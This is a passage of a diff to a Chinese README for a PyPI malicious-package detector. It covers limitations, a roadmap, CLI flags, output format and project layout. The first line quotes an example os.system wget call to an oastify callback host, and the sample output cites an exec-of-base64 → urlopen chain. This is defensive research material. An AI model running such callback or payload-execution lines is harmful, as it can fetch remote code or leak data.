+`os.system('wget https://…oastify.com/test')` 报成 *B605 shell 注入，严重度 Low*
+——它看到的是代码异味，不是恶意软件。那个缺口就是我们的层。
 
 ---
 
 ## 已知限制
 
-1. **"纯仿名 + 干净复制代码"超出图通道职责**——设计使然。`requestst`
-   （`requests` 的完整副本）不含恶意*代码*；图通道标 SUSPICIOUS，
-   registry 通道定罪。我们认为代码通道对干净代码定罪正是本系统要预防的
-   误报失败模式。
-2. **大型 monorepo**（> ~1000 个 Python 文件）可能耗尽分析预算，标记为
-   `ANALYSIS_FAILED`（绝不静默 BENIGN）。摘要有体积上限；超大图上模型
-   可能漏报。
-3. **弱模型判决抖动。** 同一输入的单次调用可能在 MALICIOUS/SUSPICIOUS
-   之间翻转。用多采样多数票缓解；单次模式实测稳定性更差。
-4. **污点是语法级的，不是语义级的。** 经由三个各自调用"看似良性工具函数"
-   的包装器路由的载荷可以逃过摘要扩展。
-5. **以 PyPI 为中心的威胁模型。** 安装/导入期作用域规则和凭据路径是
-   PyPI 特有的；移植到 npm/gems 需要新的惯用法知识，但不需要架构改动。
-6. **依赖 LLM。** 链路阶段继承底层模型的语言覆盖和拒答行为；失败降级为
-   SUSPICIOUS 或 UNKNOWN，绝不静默 BENIGN。
+1. **7% 良性 SUSPICIOUS** —— 有能力证据、缺意图证据。需要合法性通道
+   （目的地一致性、生态年龄、文档匹配），而不是降阈值。
+2. **跨函数边仍比函数内边粗** —— 函数内到语句级、跨调用到语句级，但没有完整指针分析。
+3. **自定义 VM 与运行时密钥加密仍然不透明。** 静态能恢复能力，恢复不了载荷。
+4. **成本不对称** —— 良性包比恶意包慢约 5 倍，因为歧义会触发簇分析。
+5. **100 样本的置信度** —— 0/100 误报的 95% 上界约 3%。1000+1000 正在跑以收紧。
+
+### 路线图
+
+| 阶段 | 工作 |
+|---|---|
+| **A** | 合法性通道 —— 能把 SUSPICIOUS → BENIGN 的正面证据（永不定罪） |
+| **B** | `sys.addaudithook` 沙箱 —— 跑 `setup.py` 并拦截文件/网络，5–15 秒/包，只在静态 SUSPICIOUS 时触发 |
+| **C** | 指针分析支撑的操作数解析，让 `self._address` 能落到具体端点 |
+| **D** | 动态作为第四档证据 —— **绝不**作为清白的证明 |
 
 ---
 
 ## 快速开始
 
 ```bash
-pip install zhipuai networkx py2cfg
-git clone https://github.com/chen-map/Pypi-Malicious-Code-detect-Static.git
-cd Pypi-Malicious-Code-detect-Static
-```
+pip install -r requirements.txt
 
-### 完整管线（两阶段，图 + LLM + registry）
+# 可选：PyFlow 底座（需要 Python >= 3.10）
+python3.10 -m venv pfenv && ./pfenv/bin/pip install git+https://github.com/ZJU-PL/pyflow.git
+export PYFLOW_BIN=$PWD/pfenv/bin/pyflow
 
-```bash
+# v3 管线
 python batch_solution_b_v2.py ./packages \
     --api-key "$GLM_API_KEY" \
-    --count 100 \
-    --llm-model glm-4-flashx \
-    --verify-pypi \
-    --parallel-workers 5
+    --graph-backend pyflow \
+    --llm-pipeline two_stage \
+    --llm-model-small glm-4-flash \
+    --llm-model-big glm-4-plus \
+    --pyflow-capability-model config/pypi_capability_model.json
+
+# 离线 / 无 PyFlow：自动回落到内置 DDG
+python batch_solution_b_v2.py ./packages --api-key "$GLM_API_KEY"
 ```
 
-### registry 消融（纯图 + LLM，可离线验证）
-
-```bash
-python batch_solution_b_v2.py ./packages \
-    --api-key "$GLM_API_KEY" --verify-pypi --no-pypi-gate --count 100
-```
-
-### 完全不用 LLM（确定性基线）
-
-```bash
-python batch_solution_b_v2.py ./packages --api-key dummy --count 50
-```
-
-### CLI 参数
-
-```
-位置参数:          tarfile_dir             .tar.gz 文件或解压目录
---api-key KEY      GLM API key             除 --api-key dummy 外必填
---llm-model M      第一阶段（提链）模型     默认: glm-4-flashx
---verify-pypi                              启用 registry 核验
---no-pypi-gate                             消融开关: registry 仅记录、永不定罪
---count N                                  最大包数
---extract-base D                           解压目录
---parallel-workers N                       LLM 调用并行度
---seed N                                   抽样种子（默认 42）
---no-llm-cache                             关闭判决缓存
---sandbox                                  行为探针（⚠️ 执行代码；仅限虚拟机）
-```
-
-### 测试
-
-```bash
-python tests/run_all.py     # 14 个文件；每个门控和修复都有测试钉死
-```
+| 参数 | 默认 | 含义 |
+|---|---|---|
+| `--graph-backend {builtin,pyflow}` | `builtin` | 分析底座；PyFlow 缺失时自动回落 |
+| `--llm-pipeline {single,two_stage}` | `single` | `two_stage` = 小的提议、大的判定 |
+| `--llm-model-small` / `--llm-model-big` | 回落到 `--llm-model` | 两阶段模型 |
+| `--pyflow-max-seconds` | 60 | 单命令时间预算 |
+| `--coverage-max-skip` | 0.30 | 跳过条目占比超过此值则禁止 BENIGN |
+| `--no-block-scan` | 关 | 关闭簇分析（消融） |
+| `--no-cross-scope` | 关 | 关闭边界边 + 全图链分发（消融） |
 
 ---
 
 ## 输出格式
 
-```jsonc
+```json
 {
-  "package_name": "…",
-  "final_category": "MALICIOUS | SUSPICIOUS | BENIGN | OBFUSCATED | ANALYSIS_FAILED",
-  "final_risk_score": 0.0,
-  "final_confidence": 0.0,
-  "voting_summary": "判决理由——永远有值",
-  "detection_method": "enhanced_detection | sandbox_probe | voting",
-  "subgraph_verdicts": [
-    {
-      "subgraph_name": "func_…",
-      "final_verdict": "MALICIOUS",
-      "taint_chain_count": 2,
-      "taint_categories": [{"source_category": "…", "sink_category": "…"}],
-      "escalated": false
-    }
-  ],
-  "attack_chains": {"chain_count": 4, "completeness": 0.75},
-  "enhanced_detection": {"threat_level": "…", "threats_found": 1},
-  "analysis_degraded": false
+  "package_name": "requsets-2.28.1",
+  "final_category": "MALICIOUS",
+  "graph_backend": "pyflow",
+  "llm_pipeline": "two_stage",
+  "capabilities": {"code_eval": 12, "credential_access": 3, "network_out": 108},
+  "execution_phases": {"runtime": 641, "import": 2, "install": 7},
+  "coverage": {"skip_ratio": 0.0, "allow_benign": true},
+  "block_scan": {"verdict": "MALICIOUS", "blocks_analyzed": 8, "valid_paths": 2},
+  "voting_summary": "验证链: exec(base64 载荷) → urlopen(cyberresearch…)",
+  "subgraph_verdicts": [{"final_verdict": "MALICIOUS", "taint_chain_count": 1}]
 }
 ```
-
-`ANALYSIS_FAILED` 刻意与 `BENIGN` 区分：基础设施故障绝不能伪装成干净判决。
 
 ---
 
 ## 项目结构
 
 ```
-NEW_DDG/
-├── batch_solution_b_v2.py            # 编排：多通道、门控、最终完整性检查
-├── src/
-│   ├── sso_extractor.py              # SSO 粗筛：能力提取、别名解析
-│   ├── graph_digest.py               # 图→文本序列化 + verify_paths（反幻觉）
-│   ├── llm_graph_analyst.py          # 第一阶段提链（小模型）+ 验证
-│   ├── two_stage_judge.py            # 第二阶段裁决（强模型）+ 上下文裁判
-│   ├── package_graph_analysis.py     # 包级分块分析（大图）
-│   ├── ddg_builder_v7.py             # DDG：类型化边、顺序边、摘要、调用目标
-│   ├── taint_engine.py               # 反向 BFS 污点 + 证据分级（escalation_gate）
-│   ├── call_resolver.py              # AST 调用目标解析（getattr/别名/globals）
-│   ├── call_graph_analyzer.py        # 调用图 + 攻击链重建
-│   ├── cfg_adapter.py                # py2cfg 集成 + 常量折叠可达性
-│   ├── enhanced_detector.py          # registry 身份、安装钩子、元数据权威性
-│   ├── pypi_verifier.py              # 存在性/版本/首发年龄核验
-│   ├── pypi_index.py                 # 全量 50 万名索引 + 长度分桶
-│   ├── duplicate_detector.py         # SHA-256 文件集重叠 vs 官方 sdist
-│   ├── llm_sanitizer.py              # 注释/docstring 剥离、注入标记
-│   ├── sandbox_probe.py              # audit-hook 行为探针（可选）
-│   └── common/
-│       ├── graph_partitioner.py      # 函数级分割
-│       └── pattern_matcher.py        # 危险节点检测（仅用于排序）
-├── SOLUTION_B_VOTING/src/            # 函数级分类器、规则评分器、优先级排序
-├── scripts/                          # 离线重判（阶段 1 + 阶段 2）
-├── tests/                            # 14 个套件 / 200+ 断言
-└── docs/
+src/
+  pyflow_backend.py       PyFlow → 规范图（节点/边/能力/覆盖度）
+  engine_merge.py         SSO ∪ PyFlow 能力、执行时机
+  function_catalog.py     函数打分、top-N、簇选择
+  coverage_gate.py        unknown ≠ safe
+  graph_digest.py         图 → LLM 可读文本（短 ID、IOC、escape）
+  llm_graph_analyst.py    阶段一：提链 + 验证
+  two_stage_judge.py      阶段二：判定
+  taint_engine.py         source→sink 链、硬编码/编码载荷证据
+  target_awareness.py     外传目的地分类
+  literal_decoder.py      base64/hex/zlib/marshal 静态解码
+  sso_extractor.py        能力中性 SSO 提取（常量折叠）
+  enhanced_detector.py    事实通道（安装钩子、registry、工件）
+  artifact_scanner.py     非 Python 工件（.pth/.sh/data_files）
+  benign_context.py       确定性降权（测试夹具、版本惯用法）
+config/pypi_capability_model.json   PyPI 威胁模型模式（PyFlow 扩展点）
+tests/                    19 个文件、300+ 断言
 ```
 
 ---
 
 ## 参考
 
-- **[MalSkills](https://arxiv.org/abs/2603.27204)**（华中科技大学，ASE 2026）——SSO 提取 → 依赖图 → 行为推理的架构来源；我们的粗筛和建图阶段沿用此形态并重新适配 PyPI 威胁模型，判定范式不同（LLM 自构建验证链 vs 符号规则）
-- **[Backstabber's Knife Collection](https://github.com/cybertier/Backstabbers-Knife-Collection)** — 恶意语料来源
-- **[Guarddog](https://github.com/DataDog/guarddog)**、**[Bandit4Mal](https://github.com/ohmtech-research/bandit4mal)** — 单通道基线
-- **[py2cfg](https://github.com/jimenezj6/py2cfg)** — CFG 构建
-- **[GLM（智谱 AI）](https://open.bigmodel.cn/)** — GLM-4-Flash（链路提取）与 GLM-4-Plus（判决）；亦全程参与结对编程
+```bibtex
+@misc{pyflow2026,
+  title={PyFlow: An Inter-procedural Static Analysis Framework for Python},
+  author={Gu, Zinan and Yan, Haoxiang and Yao, Peisen},
+  year={2026}, eprint={2608.07026}
+}
+
+@inproceedings{malskills2026,
+  title={MalSkills: Detecting Malicious Skills in the Agentic Supply Chain
+         via Neuro-symbolic Reasoning},
+  author={Wang, Shenao and He, Junjie and Zhao, Yanjie and Wang, Yayi
+          and Yu, Kan and Wang, Haoyu},
+  booktitle={ASE}, year={2026}
+}
+
+@article{cerebro2025,
+  title={Killing Two Birds with One Stone: Malicious Package Detection in NPM
+         and PyPI using a Single Model of Malicious Behavior Sequence},
+  journal={ACM TOSEM}, year={2025}, doi={10.1145/3705304}
+}
+
+@inproceedings{christodorescu2005semantics,
+  title={Semantics-Aware Malware Detection},
+  author={Christodorescu, Mihai and Jha, Somesh and Seshia, Sanjit A.
+          and Song, Dawn and Bryant, Randal E.},
+  booktitle={IEEE S\&P}, pages={32--46}, year={2005}
+}
+```
 
 ## 许可证
 
-MIT — 见 [LICENSE](LICENSE)。
-
-<div align="center">
-
-**⚠️** 静态分析 + 可选行为探针。判决是附带证据的决策支持——每条
-`MALICIOUS` 都给出链路、端点和需要核验的代码位置。
-
-</div>
+MIT
